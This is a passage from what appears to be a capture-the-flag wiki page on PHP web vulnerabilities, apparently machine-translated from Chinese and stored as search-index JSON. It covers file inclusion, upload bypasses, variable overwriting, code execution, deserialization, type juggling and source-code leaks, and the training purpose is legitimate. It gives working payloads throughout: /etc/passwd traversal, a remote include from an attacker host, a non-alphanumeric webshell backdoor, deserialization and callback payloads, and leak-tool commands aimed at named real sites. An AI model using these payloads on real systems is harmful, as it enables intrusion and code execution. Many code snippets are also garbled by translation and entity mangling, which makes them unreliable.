\uff1a ava.io.File () \uff0c java.io.FileReader () \u7b49 ASP\uff1a includefile \uff0c includevirtual \u7b49 When PHP includes a file, it will be executed as PHP code, regardless of the type of file.","title":"File contains"},{"location":"web/php/php/#local-file-contains","text":"The local file contains, Local File Inclusion, LFI. <?php $file = $_GET [ 'file' ]; if ( file_exists ( '/home/wwwrun/' . $file . '.php' )) { include '/home/wwwrun/' . $file . '.php' ; } ?> The above code has a local file containing, and the contents of the /etc/passwd file can be read by truncating %00. %00 truncation ?file=../../../../../../../../../etc/passwd%00 Requires magic_quotes_gpc=off , PHP is less than 5.3.4. Path length truncation ?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././. Linux requires a file name longer than 4096 and Windows needs to be longer than 256. Point number truncation ``` ? file = ... / ... // ... // ... // ... / / boot.ini/ \u2026\u2026\u2026 [...] \u2026\u2026\u2026\u2026 ``` For Windows only, the dot number needs to be longer than 256.","title":"Local file contains"},{"location":"web/php/php/#remote-file-contains","text":"The remote file contains, Remote File Inclusion, RFI. <?php if ( $route == \"share\" ) { require_once $basePath . \"/action/m_share.php\" ; } elseif ( $ route == & quot ; sharelink & quot ;) { require_once $basePath . \"/action/m_sharelink.php\" ; } Constructs the value of the variable basePath . /?basePath=http://attacker/phpshell.txt? The final code is executed require_once \"http://attacker/phpshell.txt?/action/m_share.php\"; The part after the question mark is interpreted as the querystring of the URL, which is also a kind of \"truncation\". Normal remote file contains ?file=[http|https|ftp]://example.com/shell.txt Need allow_url_fopen=On and allow_url_include=On . Utilize PHP stream input ?file=php://input \u9700\u8981 allow_url_include=On \u3002 Utilize PHP stream filter ?file=php://filter/convert.base64-encode/resource=index.php \u9700\u8981 allow_url_include=On \u3002 -Use data URIs ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= \u9700\u8981 allow_url_include=On \u3002 Execute with XSS ?file=http://127.0.0.1/path/xss.php?xss=phpcode Need allow_url_fopen=On , allow_url_include=On and the firewall or whitelist is not allowed to access the external network, first find an XSS vulnerability in the same site, including this page, you can inject malicious code.","title":"Remote file contains"},{"location":"web/php/php/#file-upload","text":"A file upload vulnerability is when a user uploads an executable script file and obtains the ability to execute server-side commands through this file. In most cases, file upload vulnerabilities generally refer to the problem of uploading a web script that can be parsed by the server, a so-called webshell issue. To complete this attack, several conditions are required. First, the uploaded file can be executed by the WEB container. Secondly, the user can access the file from the WEB. Finally, if the uploaded file is changed by security check, formatting, image compression, etc. Content may cause the attack to fail.","title":"File Upload"},{"location":"web/php/php/#bypassing-the-upload-check","text":"Front end check extension Capture the package and bypass it. Content-Type detection file type Capture the package to modify the Content-Type type to match the whitelist rules. Add a suffix to the server Try %00 truncation. Server extension detection Exploit the vulnerability. Apache parsing phpshell.php.rar.rar.rar.rar Because Apache does not know .rar this file type, so it will traverse the suffix to .php , and then think this is a PHP file. IIS parsing When the file name is abc.asp;xx.jpg under IIS 6, it will be parsed as abc.asp . PHP CGI path resolution When you visit http://www.a.com/path/test.jpg/notexist.php , test.jpg will be parsed as PHP, and notexist.php is a non-existent file. At this point, the configuration of Nginx is as follows location ~ \\.php$ { root html ; fastcgi_pass 127.0.0.1 : 9000 ; fastcgi_index index.php ; fastcgi_param SCRIPT_FILENAME /scripts $fastcgi_script_name ; include fastcgi_param ; } other methods The suffix case, double write, special suffix such as php5 , etc., modify the content of the package to the WAF and so on.","title":"Bypassing the upload check"},{"location":"web/php/php/#variable-coverage","text":"","title":"Variable coverage"},{"location":"web/php/php/#global-variable-override","text":"Variables that are not initialized and can be controlled by the user are likely to cause security problems. ` this register_globals = ON Example ```php <?php echo &quot;Register_globals:&quot;. (int) ini_get (&quot;register_globals&quot;). &quot; <br/> &quot;; if ($auth) { echo \"private!\"; } ?> When register_globals=ON , submit test.php?auth=1 , the auth variable will be automatically assigned.","title":"Global Variable Override"},{"location":"web/php/php/#extract-variable-override","text":"The extract() function can import variables from an array into the current symbol table, which is defined as int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) The second parameter specifies the behavior of the function when it is imported into the symbol table. The two most common values are EXTR_OVERWRITE and EXTR_SKIP . When the value is EXTR_OVERWRITE , in the process of importing variables into the symbol table, if the variable name conflicts, all variables are overwritten; the value of 'EXTR_SKIP means skipping without overwriting. If the second parameter is not specified, EXTR_OVERWRITE` is used by default. <?php $auth = \"0\" ; extract ( $_GET ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> Variable coverage can occur when the extract() function exports variables from an array that the user can control.","title":"extract() variable override"},{"location":"web/php/php/#import_request_variables-variable-override","text":"bool import_request_variables (string $types [, string $prefix]) import_request_variables Imports variables from GET, POST, and Cookies into the global. Use this function to simply specify the type. <?php $auth = \"0\" ; import_request_variables ( \"G\" ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> import_request_variables(&quot;G&quot;) specifies the variables to be imported into the GET request, and submits the test coverage of test.php?auth=1 .","title":"import_request_variables Variable Override"},{"location":"web/php/php/#parse_str-variable-override","text":"void parse_str ( string $str [, array &$arr ]) The parse_str() function is usually used to parse the querystring in a URL, but when the parameter value can be controlled by the user, it is likely to cause variable coverage. // var.php?var=new variable override $ var = &quot;init&quot;; parse_str($_SERVER[\"QUERY_STRING\"]); print $ var; Functions similar to parse_str() also have mb_parse_str() .","title":"parse_str() variable override"},{"location":"web/php/php/#command-execution","text":"","title":"Command Execution"},{"location":"web/php/php/#direct-execution-code","text":"There are quite a few functions in PHP that can execute code directly. eval(); assert(); system(); exec(); shell_exec(); passthru(); escapeshellcmd(); pcntl_exec(); ......","title":"Direct execution code"},{"location":"web/php/php/#preg_replace-code-execution","text":"The first argument to preg_replace() allows code execution if the /e mode modifier is present. <?php $ var = & quot ; < tag > phpinfo () </ tag > & quot ;; preg_replace ( & quot ; / < tag > ( . *? ) & lt ; / tag & gt ; / e & quot ;, & quot ; addslashes ( 1 ) & quot ;, $ var ); ?> If you don't have the /e modifier, you can try %00 truncation.","title":"preg_replace() Code Execution"},{"location":"web/php/php/#preg_match-code-execution","text":"preg_match performs a matching regular expression, allowing the code to execute if the match is successful. <?php include 'flag.php'; if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)>40){ die(\"Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code); }else{ highlight_file(__FILE__); } //$hint = \"php function getFlag() to get flag\"; ?> This question is a question from the plum wine master when the xman training session. This series of code descriptions is like this. We want to bypass the passing of regular numbers and alphabetic strings such as AZ , az , 0-9 , and convert non-alphanumeric characters into various transformations. Can construct any character in az , and the string length is less than 40 . Then use PHP to allow dynamic function execution features, stitch out a function name, here we are getFlag , and then dynamically execute the code. So, the question we need to consider is how to pass various transformations so that we can successfully read the getFlag function and get the webshell . Before we understand this, we first need to understand the concept of XOR ^ in PHP . Let's take a look at the following code: <?php echo &quot;A&quot; ^ &quot;?&quot;; ?> The results are as follows: We can see that the output is the character ~ . The reason for this is because the code A and the character ? are XORed in the code. In PHP , when two variables are XORed, the string is first converted to an ASCII value, then the ASCII value is converted to binary and then XORed, XOR is completed, and the result is converted from binary. Become an ASCII value and convert the ASCII value to a string. XOR operations are also sometimes used to exchange the values of two variables. Like the example above The ASCII value of A is 65 and the corresponding binary value is 01000001 . The ASCII value of ? is 63 and the corresponding binary value is 00111111 . The value of the exclusive OR binary is \u202d01111110\u202c , the corresponding ASCII value is 126 , and the corresponding string value is ~ . We all know that PHP is a weakly typed language, that is, in PHP we can declare a variable directly and initialize or assign it without declaring the type of the variable. It is precisely because of the PHP weak type that we implicitly convert the variable type of PHP and use this feature to perform some unconventional operations. If you convert an integer to a string, treat a boolean as an integer, or treat a string as a function, let's look at a piece of code: <?php function B(){ echo \"Hello Angel_Kitty\"; } $_++; $__= \"?\" ^ \"}\"; $__(); ?> The code execution results are as follows: Let's analyze the above code together: 1, $_++; This line of code means to increment the variable named &quot;_&quot; , the default value of the variable undefined in PHP null , null== False==0 , we can get a number by auto-incrementing the undefined variable without using any numbers. 2, $__=&quot;?&quot; ^ &quot;}&quot;; XOR the characters ? and } , and get the result B assigned to the variable named __ (two underscores) 3, $ __ (); Through the above assignment operation, the value of the variable $__ is B , so this line can be regarded as B() . In PHP , this line of code represents The function B is called, so the result is Hello Angel_Kitty . In PHP , we can treat strings as functions. Seeing this, I believe that if you see a similar PHP backdoor, you should not be so confused. You can use the sentence analysis of the backdoor code to understand the functions that the backdoor wants to achieve. We want to use this backdoor to create strings that bypass the detection and are useful to us, such as _POST , system , call_user_func_array , or whatever we need. Here is a very simple non-alphanumeric PHP backdoor: <?php @$_++; // $_ = 1 $__=(\"#\"^\"|\"); // $__ = _ $__.=(\".\"^\"~\"); // _P $ __. = (&quot;/&quot; ^ &quot;` &quot;); // _PO $ __. = (&quot;|&quot; ^ &quot;/&quot;); // _POS $__.=(\"{\"^\"/\"); // _POST ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]); ?> Here I explain, .= is a string connection, see PHP syntax for details. We can even merge the above code into one line, making the program less readable, the code is as follows: $__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\"); Looking back at the question of the xman training, our idea is to bypass the string of characters by constructing XOR, so how do we construct this string so that the length is less than 40 ? We finally want to read the getFlag function, we need to construct a _GET to read this function, we finally construct the following string: It may be that many small partners still can't understand how this string is constructed. Let's analyze the segment string.","title":"preg_match Code Execution"},{"location":"web/php/php/#construct-_get-read","text":"First of all, we have to know what X_GET` is from XOR. After my attempts and analysis, I came to the following conclusion: <?php echo \"`{{{\"^\"?<>/\";//_GET ?> What is the meaning of this code? Because of the 40-character length limit, webshells that were previously XOR-to-character-spliced cannot be used. Here you can use the backquotes ` and Linux under the php php to execute the command ? ? means matching one character ` indicates execution of the command ` Parsing a special string Since ? can only match one character, this way of writing means looping and matching. We will break it down to see: <?php echo \"{\"^\"<\"; ?> The output is: <?php echo \"{\"^\">\"; ?> The output is: <?php echo \"{\"^\"/\"; ?> The output is: So we can know that _GET is constructed like this!","title":"Construct _GET Read"},{"location":"web/php/php/#get-the-_get-parameter","text":"How do we get the _GET parameter? We can construct the following string: <?php echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__]) ?> According to the previous construction, $_ has become _GET . Naturally, $_ = _GET . We built $_GET[__] to get the parameter values.","title":"Get the _GET parameter"},{"location":"web/php/php/#incoming-parameters","text":"At this point we just need to call the getFlag function to get the webshell just fine, constructed as follows: <?php echo $_=getFlag;//getFlag ?> So connect all the parameters and you're done. The results are as follows: So we successfully read the flag!","title":"Incoming parameters"},{"location":"web/php/php/#dynamic-function-execution","text":"User-defined functions can lead to code execution. <?php $ dyn_func = $ _GET [ & quot ; dyn_func & quot ;]; $argument = $_GET [ \"argument\" ]; $ dyn_func ( $ argument ); ?>","title":"Dynamic function execution"},{"location":"web/php/php/#backquote-command-execution","text":"<?php echo `ls -al` ; ?>","title":"Backquote command execution"},{"location":"web/php/php/#curly-syntax","text":"PHP's Curly Syntax can also lead to code execution, it will execute the code between the curly braces and replace the results. <?php $ var = & quot ; aaabbbccc $ { ` ls` } & quot ;; ?> <?php $foobar = \"phpinfo\" ; $ { & quot ; foobar & quot ;} (); ?>","title":"Curly Syntax"},{"location":"web/php/php/#callback","text":"Many functions can execute callback functions, which will cause code execution when the callback function is controllable by the user. <?php $evil_callback = $_GET [ \"callback\" ]; $some_array = array ( 0 , 1 , 2 , 3 ); $new_array = array_map ( $evil_callback , $some_array ); ?> Attack payload http://www.a.com/index.php?callback=phpinfo","title":"Callback"},{"location":"web/php/php/#deserialization","text":"If unserialize() defines a __destruct() or __wakeup() function at execution time, it may cause code execution. <?php class Example { was $ var = & quot ; & quot ;; function __destruct () { eval ( $this -> var ); } } unserialize ( $_GET [ \"saved_code\" ]); ?> Attack payload http://www.a.com/index.php?saved_code=O:7:\"Example\":1:{s:3:\"var\";s:10:\"phpinfo();\";}","title":"Deserialization"},{"location":"web/php/php/#php-features","text":"","title":"PHP Features"},{"location":"web/php/php/#array","text":"<?php $ var = 1 ; $ var = array (); $ var = & quot ; string & quot ;; ?> Php does not strictly check incoming variable types, nor can it convert types freely. For example, in the comparison of $a == $b $a = null; $b = false; // is true $a = ''; $b = 0; //also true However, the developers of the PHP kernel originally wanted to let programmers develop more efficiently with this system that does not require declarations, so many loosely used comparisons and transformations were used in almost all built-in functions and basic structures to prevent programs from being used. The variables are frequently reported incorrectly because of the programmer's irregularity, but this brings security problems. 0=='0' //true 0 == 'abcdefg' //true 0 === 'abcdefg' //false 1 == '1abcdef' //true","title":"Array"},{"location":"web/php/php/#magic-hash","text":"\"0e132456789\"==\"0e7124511451155\" //true \"0e123456abc\"==\"0e1dddada\" //false \"0e1abc\"==\"0\" //true When a comparison operation is performed, if a string such as 0e\\d+ is encountered, the string is parsed into scientific notation. So the values of the two numbers in the above example are all 0 and thus equal. If the pattern of 0e\\d+ is not satisfied, it will not be equal.","title":"Magic Hash"},{"location":"web/php/php/#hex-conversion","text":"\"0x1e240\"==\"123456\" //true \"0x1e240\"==123456 //true \"0x1e240\"==\"1e240\" //false When one of the strings starts with 0x , PHP parses the string into decimal and then compares it. 0x1240 parsing into decimal is 123456, so with the int type and the string type of 123456 The comparisons are all equal.","title":"hex conversion"},{"location":"web/php/php/#type-conversion","text":"The common conversions are mainly int converted to string , string converted to int . int turn string $ var = 5; Method 1: $item = (string) $var; Method 2: $item = strval($var); string turns int : intval() function. For this function, you can look at 2 examples first. var_dump (intval (&#39;2&#39;)) // 2 var_dump (intval (&#39;3abcd&#39;)) // 3 var_dump (intval (&#39;abcd&#39;)) // 0 When the intval() conversion is specified, it will be converted from the beginning of the string to know that a non-numeric character has been encountered. Even if there is a string that cannot be converted, intval() will not report an error but return 0. At the same time, programmers should not use the following code when programming: if(intval($a)>1000) { mysql_query(\"select * from news where id=\".$a) } At this time, the value of $a may be 1002 union .","title":"Type conversion"},{"location":"web/php/php/#looseness-of-parameters-of-built-in-functions","text":"The looseness of the built-in function is that when the function is called, the function is passed to the function type that the function cannot accept. Explain a bit of a mouthful, or directly through the actual examples to illustrate the problem, the following will focus on a few of these functions. md5() $array1[] = array( \"foo\" => \"bar\", \"bar\" => \"foo\", ); $array2 = array(\"foo\", \"bar\", \"hello\", \"world\"); var_dump (md5 ($ array1) == md5 ($ array2)); //threaten The description of the md5() function in the PHP manual is string md5 ( string $str [, bool $raw_output = false ] ) , and the requirement in md5() is a string type parameter. But when you pass an array, md5() will not report an error, but will not be able to correctly find the md5 value of the array, which will cause the md5 values of any 2 arrays to be equal. strcmp() The strcmp() function is described in the official PHP manual as intstrcmp ( string $str1 , string $str2 ) , which needs to pass 2 arguments of type string to strcmp() . If str1 is less than str2 , it returns -1, and equality returns 0, otherwise it returns 1. The essence of the strcmp() function to compare strings is to convert two variables to ASCII, then perform the subtraction, and then determine the return value based on the result of the operation. What if the argument that gives strcmp() is a number? $array=[1,2,3]; Var_dump(strcmp($array,&#39;123&#39;)); //null, in a sense null is equivalent to false. switch() If switch() is a case of a numeric type, switch will convert the parameters to an int. as follows: $i =\"2abc\"; switch ($i) { case 0: case 1: case 2: echo \"i is less than 3 but not negative\"; break; case 3: echo \"i is 3\"; } At this time, the program outputs i is less than 3 but not negative because the switch() function converts $i and the result is 2. in_array() In the PHP manual, the in_array() function is interpreted as bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) . If the strict parameter is not provided, then in_array will be loose. Compare to see if $needle is in $haystack . When the value of strict is true, in_array() compares the type of needls with the type in haystack. $array=[0,1,2,'3']; var_dump(in_array('abc', $array)); //true var_dump(in_array('1bc', $array)); //true You can see that the above case returns true, because &#39;abc&#39; will be converted to 0, and &#39;1bc&#39; will be converted to 1. array_search() is the same as in_array() .","title":"Looseness of parameters of built-in functions"},{"location":"web/php/php/#looking-for-source-code-backup","text":"","title":"Looking for source code backup"},{"location":"web/php/php/#hg-source-code-leak","text":"`hg files are generated when hg init . [Using the tool dvcs-ripper] ( https://github.com/kost/dvcs-ripper )","title":"hg Source code leak"},{"location":"web/php/php/#git-source-leaks","text":"The .git directory contains files such as code change records. If the files in this directory are accessible when deployed, they may be used to restore the source code. /.git /.git/HEAD /.git/index /.git/config /.git/description GitHack python GitHack.py http://www.openssl.org/.git/ [GitHacker (Recoverable Full Git Repository)] ( https://github.com/WangYihang/GitHacker ) python GitHacker.py http://www.openssl.org/.git/","title":"Git Source leaks"},{"location":"web/php/php/#ds_store-file-leaked","text":"Mac OS will contain a .DS_Store file containing information such as the file name. [Using the tool ds_store_exp] ( https://github.com/lijiejie/ds_store_exp ) python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store hd.zj.qq.com/ \u2514\u2500\u2500 themes Axy\u2500\u2500 galaxyw \u251c\u2500\u2500 app \u2502 \u2514\u2500\u2500 css \u2502 \u2514\u2500\u2500 style.min.css \u251c\u2500\u2500 cityData.min.js \u251c\u2500\u2500 images \u2502 \u2514\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-hd.png \u2502 \u251c\u2500\u2500 bg-item-activity.png \u2502 \u251c\u2500\u2500 bg-mask-pop.png \u2502 \u251c\u2500\u2500 btn-bm.png \u2502 \u251c\u2500\u2500 btn-login-qq.png \u2502 \u251c\u2500\u2500 btn-login-wx.png \u2502 \u251c\u2500\u2500 ico-add-pic.png \u2502 \u251c\u2500\u2500 ico-address.png \u2502 \u251c\u2500\u2500 ico-bm.png \u2502 \u251c\u2500\u2500 ico-duration-time.png \u2502 \u251c\u2500\u2500 ico-pop-close.png \u2502 \u251c\u2500\u2500 ico-right-top-delete.png \u2502 \u251c\u2500\u2500 page-login-hd.png \u2502 \u251c\u2500\u2500 pic-topeng.png \u2502 \u2514\u2500\u2500 ticket-selected.png \u2514\u2500\u2500 member \u251c\u2500\u2500 assets \u2502 \u251c\u2500\u2500 css \u2502 \u2502 \u251c\u2500\u2500 ace-reset.css \u2514 \u2514\u2500\u2500 antd.css \u2502 \u2514\u2500\u2500 lib \u2502 \u251c\u2500\u2500 cityData.min.js \u2502 \u2514\u2500\u2500 ueditor \u2502 \u251c\u2500\u2500 index.html \u2502 \u251c\u2500\u2500 lang Zh-\u2502 \u2502 \u2514\u2500\u2500 \u2502 \u2502 \u251c\u2500\u2500 images \u2502 \u2502 \u2502 \u251c\u2500\u2500 copy.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 localimage.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 music.png \u2502 \u2502 \u2502 \u2514\u2500\u2500 upload.png \u2502 \u2502 \u2514\u2500\u2500 zh cn.js \u2502 \u251c\u2500\u2500 php \u2502 \u2502 \u251c\u2500\u2500 action_crawler.php \u2502 \u2502 \u251c\u2500\u2500 action_list.php \u2502 \u2502 \u251c\u2500\u2500 action_upload.php \u2502 \u2502 \u251c\u2500\u2500 config.json \u2502 \u2502 \u251c\u2500\u2500 controller.php \u2502 \u2502 \u2514\u2500\u2500 Uploader.class.php \u2502 \u251c\u2500\u2500 ueditor.all.js \u2502 \u251c\u2500\u2500 ueditor.all.min.js \u2502 \u251c\u2500\u2500 ueditor.config.js \u2502 \u251c\u2500\u2500 ueditor.parse.js \u2502 \u2514\u2500\u2500 ueditor.parse.min.js \u2514\u2500\u2500 static \u251c\u2500\u2500 css \u2502 \u2514\u2500\u2500 page.css \u251c\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-table-title.png \u2502 \u251c\u2500\u2500 bg-tab-say.png \u2502 \u251c\u2500\u2500 ico-black-disabled.png \u2502 \u251c\u2500\u2500 ico-black-enabled.png \u2502 \u251c\u2500\u2500 ico-coorption-person.png \u2502 \u251c\u2500\u2500 ico-miss-person.png \u2502 \u251c\u2500\u2500 ico-mr-person.png \u2502 \u251c\u2500\u2500 ico-white-disabled.png \u2502 \u2514\u2500\u2500 ico-white-enabled.png \u2514\u2500\u2500 scripts \u251c\u2500\u2500 js \u2514\u2500\u2500 lib \u2514\u2500\u2500 jquery.min.js 21 directories, 48 files","title":".DS_Store File leaked"},{"location":"web/php/php/#website-backup-file","text":"The administrator incorrectly placed the backup under the web directory after backing up the website file. Common suffixes: .rar .zip 7.z tar .tar.gz .behind .txt","title":"Website backup file"},{"location":"web/php/php/#svn-leak","text":"Sensitive documents: /.svn /.svn/wc.db /.svn/entries dvcs-ripper perl rip-svn.pl -v -u http://www.example.com/.svn/ [Seay - SVN] ( http://tools.40huo.cn/#!web.md# source leak)","title":"SVN Leak"},{"location":"web/php/php/#web-inf-webxml-leaked","text":"WEB-INF is a secure directory for Java web applications, and there are file mappings in web.xml. WEB-INF mainly contains the following files or directories: /WEB-INF/web.xml : Web application configuration file that describes the servlet and other application component configuration and naming rules. /WEB-INF/classes/ : Contains all the class files used by the site, including servlet class and non-servlet class, they cannot be included. In the jar file. /WEB-INF/lib/ : Stores various jar files required by the web application, and places jar files that are only required in this application, such as database driver jar files. /WEB-INF/src/ : source directory, each java file is placed according to the package name structure. /WEB-INF/database.properties : Database configuration file. By finding the web.xml file, inferring the path to the class file, and finally by directly classifying the file, the website source code is obtained by decompiling the class file. In general, the jsp engine is forbidden to access the WEB-INF directory by default. When Nginx works with Tomcat to balance load or cluster, the cause of the problem is actually very simple. Nginx will not consider configuring other type engines (Nginx is not a jsp engine). The security issue is introduced into its own security specification (so that the coupling is too high), modifying the Nginx configuration file to block access to the WEB-INF directory is fine: Location ~ ^/WEB-INF/* { deny all ; } # or return 404; or other!","title":"WEB-INF / web.xml leaked"},{"location":"web/php/php/#cvs-leak","text":"Http://url/CVS/Root returns the root information Http://url/CVS/Entries returns the structure of all files Retrieve source code bk clone http://url/name dir","title":"CVS Leak"},{"location":"web/php/php/#references","text":"Remember the pit that the webshell stepped on (how to write a backdoor that does not contain numbers and letters in PHP)","title":"references"}]}